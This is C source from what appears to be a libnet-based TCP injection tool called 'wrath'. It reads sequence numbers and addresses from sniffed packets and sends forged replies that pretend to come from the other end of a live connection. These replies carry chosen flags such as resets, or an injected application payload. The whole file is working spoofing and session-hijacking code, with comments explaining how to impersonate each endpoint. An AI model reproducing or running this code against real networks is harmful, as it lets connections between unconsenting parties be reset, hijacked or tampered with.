#include <libnet.h>
#include "wrath-structs.h"
 

void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet, int ack_increment, FILE *out) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
	wrath_capture_stats(iphdr, tcphdr, out);

	int tcp_sum = cline_args->tcp_syn + cline_args->tcp_fin + cline_args->tcp_ack + cline_args->tcp_psh + cline_args->tcp_urg + cline_args->tcp_rst;	
	wrath_attack_packet_stats(iphdr, tcphdr, tcp_sum, 0, out);

	/* building tcp header */
	libnet_build_tcp( ntohs(tcphdr->th_dport), ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack),
	ntohl(tcphdr->th_seq) + ack_increment, tcp_sum, 4024, 0, 0, 0, NULL, 0, libnet_handle, 0);
	
	/* building ip header */
	libnet_build_ipv4(LIBNET_TCP_H, IPTOS_LOWDELAY,	libnet_get_prand(LIBNET_PRu16), 0, 128,				
	IPPROTO_TCP, 0,	iphdr->ip_dst.s_addr, iphdr->ip_src.s_addr, NULL, 0, libnet_handle, 0);				

	/* launch and clear */
	libnet_write(libnet_handle);
	libnet_clear_packet(libnet_handle);
	
}

/* builds a more customizable TCP packet
 * @param src_host in_addr struct
 * @param dst_host in_addr struct
 * @param src_port short
 * @param dst_port short
 * @param seq long
 * @param ack
 * tcp_flags
 * Expects all parameters to arrive in host-byte ordering */
void wrath_tcp_custom_build_and_launch(libnet_t *libnet_handle, struct in_addr src_host, struct in_addr dst_host, 
	short src_port, short dst_port, long seq, long ack, int tcp_flags) {

	/* building tcp header */
	libnet_build_tcp( src_port, dst_port, seq, ack,
	tcp_flags, 4024, 0, 0, 0, NULL, 0, libnet_handle, 0);
	
	/* building ip header */
	libnet_build_ipv4(LIBNET_TCP_H, IPTOS_LOWDELAY,	libnet_get_prand(LIBNET_PRu16), 0, 128,				
	IPPROTO_TCP, 0,	src_host.s_addr, dst_host.s_addr, NULL, 0, libnet_handle, 0);				

	/* launch and clear */
	libnet_write(libnet_handle);
	libnet_clear_packet(libnet_handle);
	
}

/* builds a tcp packet that supports an upper level protocol
 * @param an argument bundle,
 * @param a captured packet,
 * @param a pointer to an upper-level protocol payload,
 * @param the sum of TCP Flags 
 * @param amount to increment the seq number by */
void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload, int ack_increment, unsigned int tcp_sum) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	/* libnet_build_tcp */
	libnet_build_tcp(
	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_ack), 		// seq (pretend to be next packet)
	ntohl(tcphdr->th_seq) + ack_increment,		// ack
	tcp_sum,			// flags
	60000,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	(u_int8_t *) payload,		// *payload (maybe app-level here)
	strlen(payload),		// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);
	libnet_clear_packet(libnet_handle);
}


